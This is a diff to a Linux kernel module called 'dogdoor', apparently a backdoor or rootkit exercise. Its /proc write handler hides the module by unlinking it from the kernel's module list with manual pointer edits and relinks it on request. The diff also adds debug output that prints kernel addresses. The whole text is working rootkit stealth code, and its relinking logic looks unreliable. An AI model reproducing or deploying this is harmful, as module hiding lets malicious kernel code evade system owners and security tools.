@@ -24,6 +24,7 @@ int fname_count = 0;
 int prog_num = 0;
 char message[256];
 struct list_head this;
+struct list_head *list_temp;
 struct list_head *prev;
 struct list_head *next;
 bool hidden = false;
@@ -129,11 +130,17 @@ static ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, si
 	}
 	else if (prog_num == 3) {
 		if (hidden) {
-			__list_add(&this, prev, next);
+			//__list_add(&this, prev, next);
+			//if (__list_add_valid(&this, prev, next)){
+			next->prev = list_temp;
+			prev->next = list_temp;
 			printk("******* Not Hidden!! *******");
 			hidden = false;
+			//}
 		} else {
-			__list_del(prev, next);
+			//__list_del(prev, next);
+			next->prev = prev;
+			prev->next = next;
 			printk("******* Hidden!!! ********");
 			hidden = true;
 		}
@@ -176,6 +183,9 @@ static int __init dogdoor_init(void) {
 	this = THIS_MODULE->list;
 	next = (&this)->next;
 	prev = (&this)->prev;
+	list_temp = next->prev;
+	printk("%x, %x, %x", &this, next, prev);
+	printk("%x, %x, %x", list_temp, next->prev, prev->next);
 
 	return 0;
 }
